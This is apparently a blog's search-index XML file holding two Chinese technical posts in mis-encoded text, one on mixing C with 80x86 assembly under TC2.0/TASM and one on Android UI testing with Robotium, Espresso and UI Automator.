<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[80x86ä¸‹æ±‡ç¼–ä¸ŽCè¯­è¨€çš„æ··åˆç¼–ç¨‹]]></title>
    <url>%2F2018%2F07%2F02%2F80x86_asm_c%2F</url>
    <content type="text"><![CDATA[å†™åœ¨å‰é¢åœ¨æ±‡ç¼–è¯¾ç¨‹ä¸­çš„å®žéªŒä¸­è¦æ±‚äº†æˆ‘ä»¬åœ¨80x86ä¸‹å®žçŽ°Cè¯­è¨€ä¸Žæ±‡ç¼–ä»£ç çš„æ··åˆç¼–ç¨‹ï¼Œè™½ç„¶80x86æ—¶ä»£ç¦»çŽ°ä»£æœ‰äº›ä¹…è¿œï¼Œä½†æˆ‘ä»¬ä»å¯ä»¥æŠŠ80x86å½“ä½œx86çš„ä¸€ä¸ªç®€åŒ–ç‰ˆæœ¬æ¥å­¦ä¹ ä¸€äº›é‡è¦çš„æ¦‚å¿µã€‚ ä»Žä¸€ä¸ªä¾‹å­å¼€å§‹12345678910111213141516#include &lt;stdio.h&gt;extern int test_fun(void *param);extern int var_from_asm;int global_init = 10;int global;static int static_init = 1000;static int static_var;char *string = &quot;test string&quot;;int main() &#123; int value = 666; test_fun(&amp;value); printf(&quot;var from asm:%d\n&quot;, var_from_asm); printf(&quot;assign from asm:%d\n&quot;, global); printf(&quot;value passed by stack:%d\n&quot;, global_init); return 0;&#125; å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨Cè¯­è¨€ä¸­åˆ†åˆ«å®šä¹‰äº†å‡ ç§ç±»åž‹çš„å˜é‡ï¼šåˆå§‹åŒ–è¿‡çš„å…¨å±€å˜é‡ã€æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ã€åˆå§‹åŒ–è¿‡çš„é™æ€å˜é‡ã€æœªåˆå§‹åŒ–çš„é™æ€å˜é‡ä¸Žå­—ç¬¦ä¸²ã€‚å®šä¹‰è¿™äº›å˜é‡æ˜¯ä¸ºäº†æŸ¥çœ‹ç¼–è¯‘åŽå„å˜é‡æ‰€å¤„çš„æ•°æ®æ®µä¸Žå­˜æ”¾å½¢å¼ã€‚ åŒæ—¶ä¹Ÿå£°æ˜Žäº†ä¸€ä¸ªå¤–éƒ¨å‡½æ•°test_fun()ä¸Žä¸€ä¸ªå¤–éƒ¨å˜é‡var_from_asmï¼Œç”¨æ¥æµ‹è¯•Cè¯­è¨€å¯¹asmå£°æ˜Žçš„ç¬¦å·çš„å¼•ç”¨ã€‚ çŽ°åœ¨æˆ‘ä»¬ç¼–è¯‘è¿™ä¸ªCè¯­è¨€æ–‡ä»¶åˆ°æ±‡ç¼–æ–‡ä»¶ï¼Œä½¿ç”¨TC2.0çš„å‘½ä»¤è¡Œå·¥å…·tccï¼Œä½¿ç”¨-Så‚æ•°ï¼Œå³å¯åœ¨åŒç›®å½•ç”ŸæˆåŒåçš„ASMæ–‡ä»¶ï¼š æˆ‘ä»¬æ‰“å¼€æ–‡ä»¶ï¼Œåˆ é™¤ä¸€äº›debugä¿¡æ¯åŽçš„ç»“æžœå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112_TEXT segment byte public &apos;CODE&apos;_TEXT endsDGROUP group _DATA,_BSS assume cs:_TEXT,ds:DGROUP_DATA segment word public &apos;DATA&apos;_DATA ends_BSS segment word public &apos;BSS&apos;_BSS ends_DATA segment word public &apos;DATA&apos;_global_init label word db 10 db 0static_init label word db 232 db 3_string label word dw DGROUP:s@_DATA ends_TEXT segment byte public &apos;CODE&apos; ; ; int main() &#123; ; assume cs:_TEXT_main proc near push bp mov bp,sp sub sp,2 ; ; int value = 666; ; mov word ptr [bp-2],666 ; ; test_fun(&amp;value); ; lea ax,word ptr [bp-2] push ax call near ptr _test_fun pop cx ; ; printf(&quot;var from asm:%d\n&quot;, var_from_asm); ; push word ptr DGROUP:_var_from_asm mov ax,offset DGROUP:s@+12 push ax call near ptr _printf pop cx pop cx ; ; printf(&quot;assign from asm:%d\n&quot;, global); ; push word ptr DGROUP:_global mov ax,offset DGROUP:s@+29 push ax call near ptr _printf pop cx pop cx ; ; printf(&quot;value passed by stack:%d\n&quot;, global_init); ; push word ptr DGROUP:_global_init mov ax,offset DGROUP:s@+49 push ax call near ptr _printf pop cx pop cx ; ; return 0; ; xor ax,ax jmp short @1@58@1@58: ; ; &#125; ; mov sp,bp pop bp ret _main endp_TEXT ends_BSS segment word public &apos;BSS&apos;static_var label word db 2 dup (?)_global label word db 2 dup (?)_BSS ends_DATA segment word public &apos;DATA&apos;s@ label byte db &apos;test string&apos; db 0 db &apos;var from asm:%d&apos; db 10 db 0 db &apos;assign from asm:%d&apos; db 10 db 0 db &apos;value passed by stack:%d&apos; db 10 db 0_DATA ends_TEXT segment byte public &apos;CODE&apos;_TEXT ends public _main public _string_static_var equ static_var_static_init equ static_init public _global public _global_init extrn _var_from_asm:word extrn _test_fun:near extrn _printf:near_s@ equ s@ end é¦–å…ˆå¯ä»¥å‘çŽ°å‡ ä¸ªæ•°æ®æ®µï¼š 123_TEXT segment byte public &apos;CODE&apos;_DATA segment word public &apos;DATA&apos;_BSS segment word public &apos;BSS&apos; æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Ÿè™½ç„¶æ˜¯80386ï¼Œä½†æ˜¯çŽ°ä»£ELFä¸­ä»å¯ä»¥è§åˆ°è¿™å‡ ä¸ªèŠ‚çš„èº«å½±ã€‚DGROUP group _DATA,_BSS DGROUPè¡¨ç¤º_DATAä¸Ž_BSSæ®µåˆæˆçš„æ®µæ ‡å·ã€‚åˆ†æžè¿™å‡ ä¸ªæ®µä¸­çš„å†…å®¹ï¼Œå¯ä»¥å‘çŽ°_TEXTæ®µå³è¿è¡Œæ—¶çš„CSæ®µï¼Œå­˜æ”¾ç€ä»£ç ã€‚_DATAæ®µä¸­å­˜æ”¾ç€ä¸‹åˆ—å†…å®¹ï¼š 12345678_global_init label word db 10 db 0static_init label word db 232 db 3_string label word dw DGROUP:s@ å‰ä¸¤ä¸ªå³å·²ç»åˆå§‹åŒ–çš„å…¨å±€å˜é‡ä¸Žé™æ€å˜é‡ã€‚ç¬¬ä¸‰ä¸ªæ˜¯ä¸€ä¸ªåˆ«åï¼Œæ‰¾åˆ°å®ƒçš„å®šä¹‰ï¼š 123456789101112s@ label byte db &apos;test string&apos; db 0 db &apos;var from asm:%d&apos; db 10 db 0 db &apos;assign from asm:%d&apos; db 10 db 0 db &apos;value passed by stack:%d&apos; db 10 db 0 æˆ‘ä»¬ä¸ä½†åœ¨s@å¤„å‘çŽ°äº†å­—ç¬¦ä¸²å¸¸é‡test stringï¼Œè€Œä¸”å‘çŽ°è¿™é‡Œå­˜æ”¾ç€printfä¸­ä½¿ç”¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚ _BSSï¼ˆæ„ä¸ºBlock Started by Symbolï¼‰ä¸­å­˜æ”¾ç€ä¸ºå°šæœªåˆå§‹åŒ–æˆ–åˆå§‹åŒ–ä¸ºé›¶çš„å…¨å±€æˆ–é™æ€å˜é‡é¢„ç•™çš„ç©ºé—´ï¼Œåœ¨è¿™é‡Œï¼Œå®ƒå­˜æ”¾ç€å¦‚ä¸‹å†…å®¹ï¼š 1234static_var label word db 2 dup (?)_global label word db 2 dup (?) ä½ å¯èƒ½å·²ç»å‘çŽ°ï¼Œæˆ‘ä»¬åœ¨Cè¯­è¨€ä¸­å®šä¹‰çš„å˜é‡åœ¨ç”Ÿæˆçš„æ±‡ç¼–ä»£ç ä¸­è¢«åŠ ä¸Šäº†ä¸‹åˆ’çº¿å‰ç¼€ï¼Œå…¶å®žä¸å…‰æ˜¯å˜é‡åï¼Œå‡½æ•°åä¹Ÿä¼šè¢«ç¼–è¯‘å™¨åšç›¸åŒçš„å¤„ç†ï¼š 1_main proc near åœ¨æ–‡ä»¶çš„æœ«å°¾è¿˜æœ‰å¦‚ä¸‹å†…å®¹ï¼š 12345678910 public _main public _string_static_var equ static_var_static_init equ static_init public _global public _global_init extrn _var_from_asm:word extrn _test_fun:near extrn _printf:near_s@ equ s@ å¯ä»¥çœ‹åˆ°ä½¿ç”¨publicå…³é”®å­—å£°æ˜Žäº†å…¨å±€å˜é‡stringã€globalã€global_initä¸Žå‡½æ•°mainï¼Œä»¥ä¾¿å¤–éƒ¨åŽ»å¼•ç”¨ä»–ä»¬ã€‚åŒæ—¶ä¹Ÿä½¿ç”¨extrnå…³é”®å­—å£°æ˜Žäº†å¤–éƒ¨å®šä¹‰çš„_var_from_asmã€_test_funã€_printfï¼Œåœ¨é“¾æŽ¥æ—¶ä¼šè§£æžè¿™äº›æ ‡è®°å®Œæˆåç§»åœ°å€çš„ä¿®æ”¹ã€‚ åˆ°è¿™é‡Œæˆ‘ä»¬å·²ç»åˆ†æžå®Œäº†test.cç¼–è¯‘åŽçš„å†…å®¹ã€‚ ä¸‹é¢æ˜¯æµ‹è¯•ä½¿ç”¨çš„æ±‡ç¼–ç¨‹åºt.asmï¼š 1234567891011121314151617181920212223242526public _test_funpublic _var_from_asmextrn _global:byte, _global_init:byte_DATA segment use16 word public &apos;DATA&apos; _var_from_asm label word db 10 db 0_DATA ends_TEXT segment use16 byte public &apos;CODE&apos; assume CS:_TEXT, DS:_DATA_test_fun proc near push bp mov bp, sp push di mov ax, 6[bp] mov word ptr _global_init, ax mov word ptr _global, 100 pop di pop bp ret_test_fun endp_TEXT endsend ç¨‹åºæ¯”è¾ƒç®€å•ï¼Œåœ¨å¤´éƒ¨åŒæ ·åœ°å£°æ˜Žäº†å¯¹å¤–çš„ç¬¦å·ä¸Žå¼•ç”¨çš„å¤–éƒ¨çš„ç¬¦å·ã€‚ åŒæ—¶ï¼Œä¸ºäº†å®žçŽ°ä¸ŽCç¨‹åºçš„ç›¸äº’å¼•ç”¨ï¼Œæˆ‘ä»¬ä½¿ç”¨ç›¸åŒçš„æ ‡è¯†å®šä¹‰äº†_DATAæ®µä¸Ž_TEXTæ®µï¼Œä¸ºäº†ä½¿Cè¯­è¨€å¯ä»¥ä»¥var_from_asmçš„å½¢å¼ä½¿ç”¨æ±‡ç¼–ä¸­å®šä¹‰çš„å˜é‡ï¼Œæ‰€ä»¥åœ¨_DATAæ®µä¸­ä½¿ç”¨_var_from_asmå£°æ˜Žäº†ä¸¤ä¸ªå­—èŠ‚å¹¶åˆå§‹åŒ–ä¸º10çš„ç©ºé—´ã€‚ åŒç†ï¼Œåœ¨_TEXTæ®µä¸­ä½¿ç”¨_test_funä½œä¸ºå­ç¨‹åºåå®šä¹‰äº†å‡½æ•°test_funã€‚ è€Œåœ¨test_funä¸­ï¼Œæˆ‘ä»¬å…ˆå°†bpå…¥æ ˆï¼Œå°†spèµ‹ç»™bpåŽï¼Œå°†bp+6ä½ç½®çš„å€¼èµ‹ç»™äº†axï¼Œåœ¨å‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œä¼šå…ˆå°†å‚æ•°å…¥æ ˆï¼Œç„¶åŽå°†CSä¸ŽIPå…¥æ ˆï¼Œå ç”¨äº†4ä¸ªå­—èŠ‚çš„æ ˆç©ºé—´ï¼Œå‡½æ•°å†…è°ƒç”¨push bpåˆå ç”¨äº†2ä¸ªå­—èŠ‚çš„æ ˆç©ºé—´ï¼Œæ‰€ä»¥ä¼ å…¥çš„å‚æ•°åº”è¯¥åœ¨bp+6çš„ä½ç½®ä¸Šã€‚æˆ‘ä»¬å°†è¿™ä¸ªå‚æ•°å€¼å†™å›žåˆ°Cè¯­è¨€å®šä¹‰çš„å…¨å±€å˜é‡_global_initä¸­ï¼Œä¸‹ä¸€è¡Œå°†_globalèµ‹ä¸Šäº†100ã€‚ çŽ°åœ¨ï¼Œå°±å¯ä»¥è¿›è¡Œç¼–è¯‘é“¾æŽ¥æ­¥éª¤äº†ã€‚ ä¸€èˆ¬åœ°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Cç¼–è¯‘å™¨ç¼–è¯‘test.cç”Ÿæˆç›®æ ‡æ–‡ä»¶ï¼Œä½¿ç”¨TASMæ±‡ç¼–ç¼–è¯‘å™¨ç¼–è¯‘t.asmç”Ÿæˆç›®æ ‡æ–‡ä»¶ï¼Œå†ä½¿ç”¨tlinkå°†ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ä¸Žåº“æä¾›çš„ç›®æ ‡æ–‡ä»¶è¿›è¡Œé“¾æŽ¥ï¼Œä½†æ˜¯è¿™æ ·åšç•¥æ˜¾éº»çƒ¦ï¼Œtccä¼šè°ƒç”¨TASMç¼–è¯‘æ±‡ç¼–æ–‡ä»¶ï¼Œä¹Ÿä¼šå°†ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶å’Œåº“æ–‡ä»¶ä¸€èµ·é“¾æŽ¥å¹¶ç”Ÿæˆæœ€åŽçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦ç®€å•åœ°æ‰§è¡Œtcc test.c t.asmå°±å¯ä»¥äº†ã€‚ ç›´æŽ¥è¿è¡Œç”Ÿæˆçš„test.exeï¼ŒæŸ¥çœ‹ç»“æžœï¼š]]></content>
      <categories>
        <category>Assembly</category>
      </categories>
      <tags>
        <tag>Assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android UIè‡ªåŠ¨åŒ–æµ‹è¯•æŠ€æœ¯é€‰æ‹©ä¸Žè¸©å‘]]></title>
    <url>%2F2018%2F02%2F09%2Fandroid_ui_test%2F</url>
    <content type="text"><![CDATA[å†™åœ¨å‰é¢åœ¨å®˜æ–¹æ–‡æ¡£å…³äºŽæµ‹è¯•ä¸€èŠ‚ä¸­ï¼Œä»‹ç»äº†æµ‹è¯•é‡‘å­—å¡”è¿™ä¸€æ¦‚å¿µï¼šå³æˆ‘ä»¬åº”è¯¥åŒ…æ‹¬ä¸‰ä¸ªå±‚æ¬¡çš„æµ‹è¯•ï¼šå°åž‹ã€ä¸­åž‹ã€ä¸Žå¤§åž‹ï¼š å°åž‹æµ‹è¯•æ˜¯å•å…ƒæµ‹è¯•ï¼Œå³å¯ä»¥ç‹¬ç«‹è¿è¡Œåœ¨æ¯ä¸ªæ¨¡å—ä¸Šçš„æµ‹è¯•ã€‚å®ƒä»¬é€šå¸¸æ¨¡æ‹Ÿäº†æ¯ä¸ªä¸»è¦çš„ç»„ä»¶å¹¶ä¸”åº”è¯¥å¿«é€Ÿåœ°è¿è¡Œã€‚ ä¸­åž‹æµ‹è¯•æ˜¯ä»‹äºŽå¤§åž‹ä¸Žå°åž‹æµ‹è¯•ä¹‹é—´çš„ç»¼åˆæµ‹è¯•ï¼Œå®ƒä»¬é›†æˆäº†æ•°ä¸ªç»„ä»¶å¹¶ä¸”è¿è¡Œåœ¨æ¨¡æ‹Ÿå™¨æˆ–å®žæœºä¸Šã€‚ å¤§åž‹æµ‹è¯•æ˜¯ä»¥æ¨¡æ‹ŸUIå·¥ä½œæµæ–¹å¼è¿›è¡Œçš„ç»¼åˆUIæµ‹è¯•ï¼Œå®ƒä»¬ä¿è¯äº†å…³é”®çš„ç»ˆç«¯ç”¨æˆ·çš„ä½¿ç”¨å¯ä»¥ç¬¦åˆæˆ‘ä»¬çš„é¢„æœŸã€‚è™½ç„¶å°åž‹æµ‹è¯•è¿…é€Ÿå¹¶ä¸”ä¸“æ³¨ï¼Œå¯ä»¥è®©æˆ‘ä»¬å¾ˆå¿«åœ°å‘çŽ°é”™è¯¯ï¼Œä½†å®ƒä»¬åŒæ ·æ˜¯ä½Žä»¿çœŸä¸”è‡ªæˆä¸€ä½“çš„ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬å¾ˆéš¾ä¿è¯é€šè¿‡äº†æ‰€æœ‰çš„å•å…ƒæµ‹è¯•å°±å¯ä»¥æˆåŠŸåœ°è®©Appè¿è¡Œã€‚è€Œå¤§åž‹æµ‹è¯•çš„ä¼˜ç¼ºç‚¹æ°æ°ä¸Žä¸Šè¿°ç›¸åã€‚ç”±äºŽæ¯ä¸ªå±‚æ¬¡çš„æµ‹è¯•çš„è§’è‰²å„ä¸ç›¸åŒï¼Œæˆ‘ä»¬åº”è¯¥è¿›è¡Œæ‰€æœ‰è¿™ä¸‰ä¸ªå±‚æ¬¡çš„æµ‹è¯•ï¼Œå°½ç®¡å„ä¸ªå±‚æ¬¡ä½¿ç”¨æ¯”ä¾‹éœ€è¦æ ¹æ®Appçš„ä½¿ç”¨ç‰¹ç‚¹ï¼Œé€šå¸¸å»ºè®®ä¸‰ä¸ªæµ‹è¯•çš„æ¯”ä¾‹ä¸º1:2:7ã€‚UIè‡ªåŠ¨åŒ–æµ‹è¯•å³å±žäºŽä¸Šé¢è¯´çš„å¤§åž‹æµ‹è¯•ã€‚ æµ‹è¯•æ¡†æž¶åŠŸèƒ½å¯¹æ¯”æ¦‚è§ˆå‚è€ƒï¼š https://stackoverflow.com/questions/20046021/google-espresso-or-robotiumå®žé™…æµ‹è¯•ç¼–å†™ä½“éªŒå®žé™…çš„ç¼–å†™ä¸­ï¼Œä¸»è¦çš„æ­¥éª¤å¯ä»¥æ€»ç»“ä¸ºä¸‰æ­¥ï¼š å¦‚ä½•å®šä½æƒ³è¦æ“ä½œçš„View å¦‚ä½•æ–½åŠ æƒ³è¦è¿›è¡Œæ“ä½œ å¦‚ä½•åˆ¤æ–­Appçš„è¡Œä¸ºç¬¦åˆæˆ‘ä»¬é¢„æœŸä¸‰ç§æ¡†æž¶éƒ½ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç³»åˆ—æ–¹æ³•ï¼Œä½†ç»†èŠ‚ä¸Žæ•ˆæžœç•¥æœ‰ä¸åŒï¼š Espresso ç™½ç›’æµ‹è¯•ï¼Œä½“çŽ°åœ¨å¯ä»¥ç›´æŽ¥æ‹¿åˆ°æ˜¾ç¤ºä¸­çš„Viewå®žä¾‹ï¼Œæ‹¿åˆ°WebView DOMæ ‘ä¸­çš„Element ä¸€èˆ¬åœºæ™¯ä¸‹ï¼ŒåŒºåˆ†åº¦è¾ƒä¸ºæ˜Žæ˜¾çš„View(æœ‰å”¯ä¸€çš„id tag)ç­‰ï¼Œå¯ä»¥é€šè¿‡å¤šç§é€”å¾„å®šä½ï¼Œè¾ƒä¸ºä¾¿æ· é¢å¯¹ç‰¹æ®Šåœºæ™¯ï¼šå¦‚TabLayoutä¸­çš„Tabæ—¶ï¼Œç”±äºŽå®ƒä»¬æ‹¥æœ‰ç›¸åŒçš„ç±»åž‹ä¸Židï¼Œéš¾ä»¥å®šä½view å‡ºçŽ°å¤šçª—å£æƒ…å†µï¼ˆå¦‚dialogï¼‰ï¼Œå¯ä»¥æ­£å¸¸å¤„ç† ä¸èƒ½è§¦å‘æŒ‰è¿”å›žé”®ã€æ”¹å˜å±å¹•æ–¹å‘ç­‰æ“ä½œ UI Automator é»‘ç›’æµ‹è¯•ï¼Œä½“çŽ°åœ¨æ— æ³•æ‹¿åˆ°å…·ä½“çš„Viewï¼Œåªèƒ½æ‹¿åˆ°åŸºç±»(LinearLayoutç­‰)ï¼Œæ— æ³•çœ‹åˆ°WebViewçš„DOMæ ‘ ä¸€èˆ¬åœºæ™¯ä¸‹ï¼Œå®šä½Viewæ²¡æœ‰å·®åˆ« é¢å¯¹ç‰¹æ®Šåœºæ™¯ï¼Œå¯ä»¥é€šè¿‡æ‰¾å‡ºæ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„Viewå†æŒ‰ç´¢å¼•æ‰¾åˆ°æƒ³è¦çš„View å‡ºçŽ°å¤šçª—å£æƒ…å†µï¼šå¤„ç†å‡ºçŽ°å¼‚å¸¸ Robotium é›†åˆäº†ä¸Šè¿°æ¡†æž¶çš„ä¼˜ç‚¹ï¼Œæ—¢å¯ä»¥æ‹¿åˆ°æ˜¾ç¤ºä¸­çš„Viewå®žä¾‹ä¸ŽWebViewçš„DOMæ ‘ å¯¹ä¸Šè¿°æ¡†æž¶çš„æŽ¥å£è¿›è¡Œäº†ç»Ÿä¸€ï¼Œè°ƒç”¨æ¯”è¾ƒæ–¹ä¾¿æœ€ç»ˆæ¡†æž¶é€‰æ‹©é€šè¿‡ä¸Šè¿°æ¯”è¾ƒï¼Œå¯ä»¥çœ‹åˆ°Robotiumåœ¨æ»¡è¶³æˆ‘ä»¬è¦æ±‚çš„åŒæ—¶ç»Ÿä¸€äº†æŽ¥å£ï¼Œæ•…é€‰æ‹©Robotiumä½œä¸ºä½¿ç”¨çš„æ¡†æž¶ã€‚ä½¿ç”¨è¿‡ç¨‹ä¸­è¸©çš„ä¸€äº›å¤§å‘å˜é‡å¿…é¡»ä½¿ç”¨staticåœ¨AndroidTestç±»ä¸­ï¼ŒæœŸæœ›ä½¿ç”¨ä¸€ä¸ªbooleanæ ‡å¿—æ¥åˆ¤æ–­æ˜¯å¦å·²ç»ç™»é™†è¿‡ï¼ˆé¿å…é‡å¤æ£€æŸ¥ç™»é™†çŠ¶æ€ï¼‰ï¼Œå‘çŽ°åœ¨login()æ–¹æ³•ä¸­ç½®æ ‡å¿—ä¸ºtrueåŽè¿›å…¥ä¸‹ä¸€ä¸ªæµ‹è¯•æ—¶è¿™ä¸ªå€¼ä»ä¸ºfalseï¼ŒæŽ¨æµ‹è¿è¡Œæµ‹è¯•æ–¹æ³•æ—¶å„ä¸ªæ–¹æ³•çš„è¿è¡Œæ˜¯ç‹¬ç«‹çš„ï¼Œæ•…ä¸ä½¿ç”¨é™æ€å˜é‡åˆ™æ— æ³•ä¿å­˜çŠ¶æ€ã€‚ç­‰å¾…å¼•å‘çš„é—®é¢˜ç­‰å¾…ï¼Ÿåœ¨æˆ‘ä»¬å¯¹Viewè¿›è¡Œä¸€ä¸ªæ“ä½œä»¥åŽï¼Œæ¡†æž¶ä¼šè‡ªåŠ¨å¤„ç†ä¸‹ä¸€æ­¥åŠ¨ä½œè§¦å‘çš„æ—¶æœºï¼Œæ¯”å¦‚ç‚¹å‡»ä¸€ä¸ªTabåŽï¼Œä¼šè‡ªåŠ¨ç­‰å¾…ä¸‹ä¸€ä¸ªé¡µé¢å‡ºçŽ°å†æ‰§è¡Œä¸‹é¢çš„æ“ä½œã€‚è¿™ä¸ªç­‰å¾…åˆ¤æ–­çš„åŽŸç†æ²¡æœ‰çœ‹è¿‡æºç ä¸èƒ½ç¡®å®šï¼Œä½†æ˜¯å®žé™…ä¸­é‡åˆ°æ¯”å¦‚WebViewåŠ è½½é¡µè¿™æ ·ç­‰å¾…æ—¶é—´è¾ƒé•¿çš„é¡µé¢ï¼Œå°±ä¼šè§¦å‘ä¸‹ä¸€ä¸ªæ“ä½œçš„æ‰§è¡Œã€‚é‚£ä¹ˆé—®é¢˜å°±å‡ºçŽ°äº†ï¼Œå¦‚æžœæƒ³è¦è¿›è¡Œè¿™æ ·çš„æµ‹è¯•ï¼šç‚¹å‡»æ‰“å¼€ä¸€ä¸ªæ–‡æ¡£ï¼Œç­‰å¾…æ–‡æ¡£æ‰“å¼€å®Œæ¯•ä»¥åŽæ£€æŸ¥æ ‡é¢˜æ˜¯å¦æ˜¯æˆ‘ä»¬æ‰“å¼€çš„æ–‡æ¡£ï¼Œå¦‚æžœåœ¨æ–‡æ¡£æ²¡æœ‰åŠ è½½å®Œçš„æ—¶å€™å°±æ‰§è¡Œæ£€æŸ¥æ­¥éª¤ï¼Œå°±ä¼šäº§ç”ŸElement not foundçš„é”™è¯¯ã€‚è§£å†³æ–¹æ³• å¼ºè¡Œè®¾ç½®ç­‰å¾…æ—¶é—´åˆ©ç”¨SystemClock.sleep()æ–¹æ³•å¼ºè¡Œè®©æµ‹è¯•æš‚åœä¸€æ®µæ—¶é—´ï¼Œè¿™ä¸ªæ–¹æ³•æ¯”è¾ƒæš´åŠ›ä¹Ÿä¸ä¼˜é›…ï¼Œä¸åˆ°ä¸‡ä¸å¾—å·²ä¸è¦ä½¿ç”¨ã€‚ ä½¿ç”¨Robotiumæä¾›çš„å„ç§waitæ–¹æ³•ï¼Œé€šè¿‡è®¾ç½®é€€å‡ºæ¡ä»¶æ¥ç­‰å¾…ï¼š1234567891011121314private void waitForWebView() &#123; assertTrue(mSolo.waitForCondition(new Condition() &#123; @Override public boolean isSatisfied() &#123; View loading = null; try &#123; loading = mSolo.getView(R.id.loading); &#125; catch (AssertionFailedError e) &#123; Log.e(TAG, e.getMessage()); &#125; return null == loading || View.GONE == loading.getVisibility(); &#125; &#125;, DOC_LOAD_TIMEOUT));&#125; åœ¨è§£å†³ä¸Šé¢çš„é—®é¢˜çš„æ—¶å€™å°±ä½¿ç”¨äº†ä¸Šé¢çš„ä»£ç æ¥ç­‰å¾…WebViewæ–‡æ¡£åŠ è½½å®Œæ¯•ï¼Œè¿”å›žtrueæ—¶æ¡ä»¶æ»¡è¶³ï¼Œé€€å‡ºç­‰å¾…ï¼Œè‹¥è¶…æ—¶ï¼Œåˆ™æ–¹æ³•è¿”å›žfalseï¼Œassertå¤±è´¥è¡¨ç¤ºdocåŠ è½½è¶…æ—¶ã€‚æ­¤å¤„çš„åˆ¤æ–­æ–¹æ³•æ˜¯ç­‰å¾…loadingéšè—ã€‚123456private void waitForActivity(Class&lt;? extends Activity&gt; activity) &#123; if (mSolo.getCurrentActivity().getClass() == activity) &#123; return; &#125; assertTrue(mSolo.waitForActivity(activity));&#125; ä¸Šè¿°ä»£ç æ˜¯ä¸ºäº†ç­‰å¾…activityå¯åŠ¨ï¼Œå¯ä»¥ç”¨äºŽåˆ¤æ–­æ–°çš„activityæ˜¯å¦æ­£å¸¸å¯åŠ¨ã€‚ è·¨è¿›ç¨‹å¼•å‘çš„é—®é¢˜åœ¨åº”ç”¨ä¸­ï¼Œæ‰“å¼€çš„æ–‡æ¡£è¿è¡Œåœ¨ä¸€ä¸ªæ–°çš„è¿›ç¨‹ä¸­ï¼Œåœ¨ä½¿ç”¨Espressoçš„æ—¶å€™å°±é‡åˆ°äº†é—®é¢˜ï¼šæ— æ³•æ‹¿åˆ°æ–°è¿›ç¨‹ä¸­WebViewçš„ä¿¡æ¯ï¼ŒåŽŸå› æ²¡æœ‰ä»”ç»†åˆ†æžï¼Œä½†å¯ä»¥ç¡®å®šæ˜¯è·¨è¿›ç¨‹çš„é—®é¢˜ã€‚åœ¨Robotiumä¸­è¿™ä¸ªé—®é¢˜åŒæ ·å­˜åœ¨ã€‚ä¸ä½†å¦‚æ­¤ï¼Œå¤šè¿›ç¨‹è¿˜ä¼šå¯¼è‡´å½“å‰activityçš„åˆ¤æ–­å‡ºé”™ï¼Œæœ¬åº”åˆ¤æ–­åœ¨DocActivityä¸­ï¼Œä½†å®žé™…ä¸Šå¾—åˆ°çš„æ˜¯åœ¨åŽŸè¿›ç¨‹çš„activityä¸­ã€‚åœ¨å¤šç§æ–¹æ³•å°è¯•æ— æžœåŽï¼Œåªèƒ½æš‚æ—¶ä¿®æ”¹æºç ï¼Œå°†docæ”¾åœ¨åŒè¿›ç¨‹æ‰“å¼€ã€‚ ViewèŽ·å–çš„é—®é¢˜èŽ·å–æƒ³è¦çš„Viewæ˜¯ç¼–å†™ç”¨ä¾‹æœ€ä¸»è¦çš„éš¾ç‚¹æ‰€åœ¨ï¼Œåœ¨èŽ·å–Viewçš„æ—¶å€™ä¹Ÿé‡åˆ°äº†ä¸å°‘çš„å‘ï¼š é‡å¤å‡ºçŽ°çš„Viewå®žé™…ä¸Šé€šè¿‡getCurrentViews()èŽ·å–åˆ°çš„Viewå¯¹è±¡åŒ…æ‹¬æ‰€æœ‰activityçš„æ‰€æœ‰Viewï¼Œæ¯”å¦‚ä¸»é¡µé¢æœ‰3ä¸ªtabï¼Œæ¯ä¸ªtabä¸­æœ‰ä¸€ä¸ªRecyclerViewï¼Œè¿™ä¸‰ä¸ªRecyclerViewéƒ½æ˜¯å¯ä»¥è¢«èŽ·å–åˆ°çš„ï¼ˆè€Œä¸æ˜¯æƒ³è±¡ä¸­çš„åªèŽ·å–åˆ°å½“å‰å¯è§çš„è¿™ä¸ªï¼‰ï¼Œç”šè‡³åœ¨æ‰“å¼€æ–°çš„activityåŽï¼ŒåŽå°çš„activityä¸­çš„RecyclerViewè¿˜æ˜¯å¯ä»¥è¢«èŽ·å–åˆ°çš„ã€‚ä½†æ˜¯ä½¿ç”¨getView()æ–¹æ³•èŽ·å–çš„èŒƒå›´æ˜¯å½“å‰activityã€‚è¿™æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿå¦‚æžœè¿™äº›RecyclerViewæœ‰ç›¸åŒçš„idï¼Œä½¿ç”¨getView(int id)æ–¹æ³•èŽ·å–åˆ°çš„åªæ˜¯ç¬¬ä¸€ä¸ªï¼Œå³ä½¿åˆ‡åˆ°äº†ç¬¬äºŒä¸ªtabï¼ŒèŽ·å–åˆ°çš„è¿˜æ˜¯ç¬¬ä¸€ä¸ªtabä¸­çš„RecyclerViewã€‚é¢å¯¹è¿™ä¸ªæƒ…å†µæˆ‘ä»¬å¯ä»¥ç”¨ä¸‰ç§æ–¹æ³•ï¼š å¦‚æžœå®ƒä»¬idä¸åŒï¼Œä½¿ç”¨getView(int id)å°±å¯ä»¥æ‹¿åˆ°ç‰¹å®šçš„ã€‚å¦‚æžœidç›¸åŒï¼Œå¯ä»¥ä¼ å…¥ç¬¬äºŒä¸ªindexå‚æ•°æ¥èŽ·å–åŒidçš„ç¬¬nä¸ªå®žä¾‹ ä½¿ç”¨getView(ç±»å, int index)æ‹¿åˆ°è¯¥ç±»æ‰€æœ‰å®žä¾‹ä¸­çš„ç¬¬nä¸ªï¼Œå› 